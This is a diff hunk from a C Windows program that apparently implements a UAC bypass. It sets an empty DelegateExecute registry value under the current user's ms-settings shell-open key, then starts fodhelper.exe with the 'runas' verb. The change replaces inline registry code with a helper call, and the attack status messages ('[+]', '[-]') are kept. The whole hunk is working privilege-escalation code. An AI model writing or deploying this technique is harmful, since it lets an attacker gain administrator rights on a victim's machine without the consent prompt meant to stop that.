@@ -62,26 +62,10 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                      GetCurrentFile());
     
     // Create DelegateExecute registry value (must be REG_SZ, empty string)
-    {
-        HKEY hKey = NULL;
-        LONG res = RegCreateKeyExW(HKEY_CURRENT_USER,
-                                   L"Software\\Classes\\ms-settings\\Shell\\Open",
-                                   0, NULL, REG_OPTION_NON_VOLATILE,
-                                   KEY_ALL_ACCESS, NULL, &hKey, NULL);
-        if (res == ERROR_SUCCESS && hKey) {
-            const wchar_t* empty = L"";
-            LONG vres = RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
-                                       (const BYTE*)empty, sizeof(wchar_t));
-            printf(vres == ERROR_SUCCESS
-                   ? "[+] DelegateExecute value created.\n"
-                   : "[-] DelegateExecute RegSetValueEx failed: %ld\n", vres);
-            RegCloseKey(hKey);
-        } else {
-            printf("[-] Failed to open ms-settings\\Shell\\Open key: %ld\n", res);
-        }
-        fflush(stdout);
-    }
-    
+    // Create DelegateExecute registry value
+    SetRegistryValue(HKEY_CURRENT_USER,
+                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"DelegateExecute",
+                     L"");
     
     printf("[*] Writing registry keys...\n"); fflush(stdout);
     // Start fodhelper.exe with "runas" verb
